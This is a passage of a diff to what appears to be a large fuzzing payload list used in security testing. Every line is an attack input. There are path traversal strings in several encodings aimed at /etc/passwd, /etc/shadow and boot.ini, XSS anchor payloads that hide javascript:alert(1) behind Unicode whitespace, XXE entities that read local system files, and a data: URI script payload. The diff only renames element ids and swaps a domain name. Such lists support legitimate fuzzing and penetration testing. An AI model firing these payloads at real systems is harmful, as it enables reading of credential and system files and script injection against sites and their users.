 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
 ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
-<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="1">test</a>
 /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/
 /%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/
@@ -9453,7 +9453,7 @@ data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.do
 %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
-data:whitelisted.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+data:google.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
